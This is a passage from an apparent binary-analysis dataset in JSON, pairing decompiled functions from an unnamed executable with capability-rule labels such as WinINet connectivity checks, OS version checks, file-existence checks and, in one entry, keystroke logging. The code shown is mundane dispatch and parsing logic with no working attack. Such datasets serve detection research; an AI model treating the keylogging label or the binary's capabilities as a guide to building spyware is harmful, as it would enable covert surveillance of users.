        "decompiled_code": "\nuint64_t fcn.00060b2c(ulong *arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *arg1_00;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    \n    iVar11 = 0;\n    *arg1 = 0;\n    iVar5 = *arg2;\n    piVar1 = arg2;\n    do {\n        if (iVar5 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.0002fc74(*piVar1);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar4 = fcn.00061a86(arg1_00, 0x2e);\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        iVar5 = fcn.0005fa68(arg1_00);\n        if (iVar5 == 0) {\n            fcn.0002fc50(arg1_00);\n            if (*0x786e8 != 0) {\n                uVar6 = (**(*0x786e8 + 0x14))(arg1, *piVar1, arg3, arg4);\n                uVar10 = uVar6 & 0xffffffff;\n                if ((uVar6 == 0) && (iVar5 = *0x786e8,  *0x786e8 != 0)) goto code_r0x00060c75;\n                if (uVar6 != 0x21590005) {\n                    return uVar6;\n                }\n                goto code_r0x00060c42;\n            }\n        }\n        else {\n            if (puVar4 == NULL) {\n                iVar7 = -1;\n                pcVar9 = arg1_00;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar2 = *pcVar9;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar2 != '\\0');\n                iVar8 = ~iVar7 - 1;\n            }\n            else {\n                iVar8 = puVar4 - arg1_00;\n            }\n            fcn.0002fc50(arg1_00);\n            uVar3 = (**(iVar5 + 0x14))(arg1, iVar8 + *piVar1, arg3);\n            uVar10 = uVar3;\ncode_r0x00060c42:\n            if (iVar5 != 0) {\n                if (uVar10 != 0) {\n                    return uVar10;\n                }\ncode_r0x00060c75:\n                iVar8 = fcn.00060838(*arg1, iVar5);\n                if (iVar8 != 0) {\n                    return uVar10;\n                }\n                (**(iVar5 + 0x2c))(*arg1, 0);\n                *arg1 = 0;\n                return 0x21590004;\n            }\n        }\n        iVar11 = iVar11 + 1;\n        piVar1 = arg2 + iVar11;\n        iVar5 = *piVar1;\n    } while( true );\n}\n",
        "token_count": 781
    },
    "00060ca8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060ca8(ulong *arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *arg1_00;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    \n    iVar10 = 0;\n    *arg1 = 0;\n    iVar5 = *arg2;\n    piVar1 = arg2;\n    do {\n        if (iVar5 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.0002fc74(*piVar1);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar4 = fcn.00061a86(arg1_00, 0x2e);\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        iVar5 = fcn.0005fa68(arg1_00);\n        fcn.0002fc50(arg1_00);\n        if (iVar5 == 0) {\n            if (*0x786e8 != 0) {\n                uVar6 = (**(*0x786e8 + 0x1c))(arg1, *piVar1, arg3, arg4);\n                uVar9 = uVar6 & 0xffffffff;\n                if ((uVar6 == 0) && (iVar5 = *0x786e8,  *0x786e8 != 0)) goto code_r0x00060de9;\n                if (uVar6 != 0x21590005) {\n                    return uVar6;\n                }\n                goto code_r0x00060db6;\n            }\n        }\n        else {\n            if (puVar4 == NULL) {\n                iVar7 = -1;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar2 = *arg1_00;\n                    arg1_00 = arg1_00 + 1;\n                } while (cVar2 != '\\0');\n                iVar8 = ~iVar7 - 1;\n            }\n            else {\n                iVar8 = puVar4 - arg1_00;\n            }\n            uVar3 = (**(iVar5 + 0x1c))(arg1, iVar8 + *piVar1, arg3);\n            uVar9 = uVar3;\ncode_r0x00060db6:\n            if (iVar5 != 0) {\n                if (uVar9 != 0) {\n                    return uVar9;\n                }\ncode_r0x00060de9:\n                iVar8 = fcn.00060838(*arg1, iVar5);\n                if (iVar8 != 0) {\n                    return uVar9;\n                }\n                (**(iVar5 + 0x2c))(*arg1, 0);\n                *arg1 = 0;\n                return 0x21590004;\n            }\n        }\n        iVar10 = iVar10 + 1;\n        piVar1 = arg2 + iVar10;\n        iVar5 = *piVar1;\n    } while( true );\n}\n",
        "token_count": 755
    },
    "00060e18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060e18(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.00060a14(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x3d) || (pcVar2 = *(piVar1 + 0xf),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 255
    },
    "00060e90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060e90(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.00060a14(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x8d) || (pcVar2 = *(piVar1 + 0x23),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 279
    },
    "00060f4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060f4c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.00060a14(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x4d) || (pcVar2 = *(piVar1 + 0x13),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 264
    },
    "00060fcc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060fcc(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    ulong in_stack_00000028;\n    int64_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    uint in_stack_00000040;\n    uint in_stack_00000048;\n    \n    uVar5 = fcn.00060a14(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x55) || (pcVar2 = *(piVar1 + 0x15),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                              in_stack_00000040, in_stack_00000048);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*in_stack_00000030 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *in_stack_00000030 = 0;\n                *in_stack_00000038 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 468
    },
    "000610c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000610c8(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    uVar4 = fcn.00060a14(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x5d) || (pcVar2 = *(piVar1 + 0x17),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 295
    },
    "0006115c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0006115c(int64_t *arg1, ulong arg2, int64_t *arg3, uint *arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    \n    uVar5 = fcn.00060a14(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x65) || (pcVar2 = *(piVar1 + 0x19),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*arg3 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg3 = 0;\n                *arg4 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 407
    },
    "00061220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00061220(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.00060a14(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x6d) || (pcVar2 = *(piVar1 + 0x1b),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 279
    },
    "000612a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000612a8(int64_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint *in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    \n    uVar5 = fcn.00060a14(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x75) || (pcVar2 = *(piVar1 + 0x1d),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*arg4 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg4 = 0;\n                *in_stack_00000028 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 428
    },
    "000613bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000613bc(char **arg1, int64_t arg2, uint64_t arg3, char **arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    \n    if (**arg1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = fcn.00061a86(*arg1, 0x3d);\n        if (iVar2 == 0) {\n            if (arg3 != 0) {\n                fcn.00061b0a(arg2, *arg1, arg3);\n                *((arg3 - 1) + arg2) = 0;\n            }\n            uVar4 = 0xffffffffffffffff;\n            pcVar5 = *arg1;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            *arg4 = *arg1 + (~uVar4 - 1);\n        }\n        else {\n            iVar2 = iVar2 - *arg1;\n            if (arg3 != 0) {\n                if (arg3 < iVar2 + 1U) {\n                    iVar2 = arg3 - 1;\n                }\n                fcn.000619f6(arg2, *arg1, iVar2);\n                *(iVar2 + arg2) = 0;\n            }\n            *arg4 = *arg1 + iVar2 + 1;\n        }\n        uVar4 = 0xffffffffffffffff;\n        pcVar5 = *arg1;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = 1;\n        *arg1 = *arg1 + ~uVar4;\n    }\n    return uVar3;\n}\n",
        "token_count": 474
    },
    "000615d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.000615d4(int32_t *arg1, ushort *arg2)\n\n{\n    ulong uVar1;\n    \n    if ((*arg1 == 1) && (*(arg1 + 6) == 2)) {\n        *arg2 = 2;\n        fcn.00061a56(arg2, 0, 0x10);\n        *(arg2 + 2) = *(arg1 + 10);\n        arg2[1] = *(arg1 + 2);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0xc0000001;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "000189a4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.000189a4(ulong arg1, int64_t *arg2, ulong *arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int64_t *arg1_01;\n    int64_t *piVar3;\n    int64_t *arg1_02;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uStackX24;\n    int64_t iStackX32;\n    uint uVar10;\n    ulong in_stack_fffffffffffffce0;\n    uint uVar11;\n    uint uVar12;\n    uint32_t uVar13;\n    uchar auStack744 [16];\n    uchar auStack728 [16];\n    int64_t iStack712;\n    int64_t iStack704;\n    int64_t iStack696;\n    int64_t iStack688;\n    uint uStack680;\n    uint auStack672 [2];\n    ulong uStack664;\n    uchar *puStack656;\n    uint uStack648;\n    ulong uStack640;\n    ulong uStack632;\n    uchar auStack624 [24];\n    uchar auStack600 [536];\n    \n    uVar11 = in_stack_fffffffffffffce0 >> 0x20;\n    uVar6 = 0;\n    iStackX32 = 0;\n    if (arg3 == NULL) {\n        iVar1 = 0x21590066;\n    }\n    else {\n        arg3[7] = 0;\n        arg1_00 = fcn.0002fbc4(0x268);\n        if (arg1_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.00061a56(arg1_00, 0, 0x268);\n            arg1_01 = fcn.0002fbc4(8);\n            if (arg1_01 == NULL) {\n                iVar1 = 0x21590004;\n            }\n            else {\n                *arg1_01 = 0;\n                fcn.000619f0(auStack728, arg1);\n                fcn.0003034c(auStack600, 0x104, *arg3);\n                fcn.000619f0(auStack624, auStack600);\n                uVar12 = 0;\n                puStack656 = auStack624;\n                uVar10 = 0;\n                auStack672[0] = 0x30;\n                uStack664 = 0;\n                uStack648 = 0x40;\n                uStack640 = 0;\n                uStack632 = 0;\n                iVar1 = fcn.0001dda0(&iStackX32, 0x100001, auStack672, auStack744, 0, CONCAT44(uVar11, 0x80), 7, 1, 0x10\n                                     , 0, 0);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.00061a74(iStackX32, auStack744, &iStack712, 0x28, CONCAT44(uVar10, 4));\n                    if (iVar1 == 0) {\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack696 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack696 + -0x19db1ded53e8000;\n                        arg3[1] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack712 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack712 + -0x19db1ded53e8000;\n                        arg3[2] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack688 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack688 + -0x19db1ded53e8000;\n                        arg3[4] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack704 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack704 + -0x19db1ded53e8000;\n                        *(arg3 + 5) = uStack680;\n                        arg3[3] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                    }\n                    uVar13 = CONCAT31(uVar12 >> 8, 1);\n                    arg3[6] = 0;\n                    uStackX24 = 0;\n                    iVar2 = fcn.00061a6e(iStackX32, 0, 0, 0, auStack744, arg1_00, 0x268, 3, 1, auStack728, uVar13);\n                    if (iVar2 == 0) {\n                        iVar1 = 1;\n                        uVar9 = uVar6;\n                        do {\n                            uVar5 = uVar6;\n                            piVar3 = arg1_01;\n                            if (((((*(arg1_00 + 0x3c) & 0xfffffffe) != 2) ||\n                                 (iVar2 = fcn.00061a68(arg1_00 + 0x5e, 0x11a18, 1),  iVar2 != 0)) &&\n                                (((*(arg1_00 + 0x3c) & 0xfffffffe) != 4 ||\n                                 (iVar2 = fcn.00061a68(arg1_00 + 0x5e, 0x11a10, 2),  iVar2 != 0)))) &&\n                               (((arg3[6] = arg3[6] + *(arg1_00 + 0x28),  arg2 == NULL ||\n                                 ((*(arg1_00 + 0x38) & 0x10) != 0)) ||\n                                (iVar7 = *(arg1_00 + 0x18) + -0x19db1ded53e8000, \n                                iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7, \n                                *arg2 <= (iVar7 >> 0x17) - (iVar7 >> 0x3f))))) {\n                                uVar6 = iVar1 + 1 << 3;\n                                if (uVar6 == 0) {\n                                    fcn.0002fc50(arg1_01);\n                                    piVar3 = NULL;\ncode_r0x00018d41:\n                                    *(uVar9 + 8 + piVar3) = 0;\n                                    uVar5 = *(arg1_00 + 0x3c);\n                                    arg1_02 = fcn.0002fbc4(0x38);\n                                    if (arg1_02 == NULL) {\ncode_r0x00018d63:\n                                        arg1_02 = NULL;\n                                    }\n                                    else {\n                                        fcn.00061a56(arg1_02, 0, 0x38);\n                                        iVar7 = (uVar5 >> 1) * 2;\n                                        iVar4 = fcn.0002fbc4(iVar7 + 2);\n                                        *arg1_02 = iVar4;\n                                        if (iVar4 == 0) {\n                                            fcn.0002fc50(arg1_02);\n                                            goto code_r0x00018d63;\n                                        }\n                                        fcn.000619f6(iVar4, arg1_00 + 0x5e, iVar7);\n                                        *(iVar7 + *arg1_02) = 0;\n                                    }\n                                    *(uVar9 + piVar3) = arg1_02;\n                                    arg1_01 = piVar3;\n                                    if (arg1_02 != NULL) {\n                                        iVar7 = *(arg1_00 + 0x18) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        arg1_02[1] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        iVar7 = *(arg1_00 + 8) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        *(*(uVar9 + piVar3) + 0x10) = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        iVar7 = *(arg1_00 + 0x20) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        *(*(uVar9 + piVar3) + 0x20) = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        iVar7 = *(arg1_00 + 0x10) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        *(*(uVar9 + piVar3) + 0x18) = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        *(*(uVar9 + piVar3) + 0x28) = *(arg1_00 + 0x38);\n                                        if ((*(arg1_00 + 0x38) & 0x10) == 0) {\n                                            *(*(uVar9 + piVar3) + 0x30) = *(arg1_00 + 0x28);\n                                        }\n                                        else {\n                                            *(*(uVar9 + piVar3) + 0x30) = 0;\n                                        }\n                                        uVar9 = uVar9 + 8;\n                                        iVar1 = iVar1 + 1;\n                                        uVar5 = uStackX24;\n                                        goto code_r0x00018ea6;\n                                    }\n                                }\n                                else {\n                                    piVar3 = fcn.0002fbc4(uVar6);\n                                    if (piVar3 != NULL) {\n                                        uVar8 = iVar1 << 3;\n                                        if (uVar6 < iVar1 << 3) {\n                                            uVar8 = uVar6;\n                                        }\n                                        fcn.000619f6(piVar3, arg1_01, uVar8);\n                                        fcn.0002fc50(arg1_01);\n                                        goto code_r0x00018d41;\n                                    }\n                                }\n                                iVar1 = 0x21590004;\n                                goto code_r0x00018f2b;\n                            }\ncode_r0x00018ea6:\n                            uStackX24 = uVar5 + 1;\n                            uVar6 = uStackX24;\n                            uVar13 = uVar13 & 0xffffff00 | uStackX24 == 0;\n                            iVar2 = fcn.00061a6e(iStackX32, 0, 0, 0, auStack744, arg1_00, 0x268, 3, 1, auStack728, \n                                                 uVar13);\n                            arg1_01 = piVar3;\n                        } while (iVar2 == 0);\n                    }\n                    iVar1 = 0;\n                    if ((iVar2 == -0x7ffffffa) || (iVar1 = fcn.00061a5c(iVar2),  iVar1 == 0)) {\n                        arg3[7] = arg1_01;\n                    }\n                }\n                else {\n                    iVar1 = fcn.00061a5c(iVar1);\n                }\ncode_r0x00018f2b:\n                iVar7 = 0;\n                if ((arg1_01 != NULL) && (iVar1 != 0)) {\n                    iVar4 = *arg1_01;\n                    while (iVar4 != 0) {\n                        fcn.00018928(iVar4);\n                        iVar7 = iVar7 + 1;\n                        iVar4 = arg1_01[iVar7];\n                    }\n                    fcn.0002fc50(arg1_01);\n                }\n            }\n            fcn.0002fc50(arg1_00);\n            if (iStackX32 != 0) {\n                fcn.000619de();\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 2991
    },
    "0001fa8c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0001fa8c(ulong arg1, uint64_t *arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    if (arg1 < 2) {\n        return 1;\n    }\n    if (3 < arg1) {\n        if (arg1 < 7) {\n            return 1;\n        }\n        if (8 < arg1) {\n            if (arg1 != 9) {\n                return 1;\n            }\n            if (arg3 != 8) {\n                return 0;\n            }\n            uVar1 = *arg2;\n            uVar2 = fcn.0002fcf4(uVar1 >> 0x20);\n            uVar3 = fcn.0002fcf4(uVar1 & 0xffffffff);\n            *arg2 = CONCAT44(uVar3, uVar2);\n            return 1;\n        }\n    }\n    if (arg3 == 4) {\n        uVar4 = fcn.0002fcf4(*arg2);\n        *arg2 = uVar4;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 267
    },
    "00020034": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
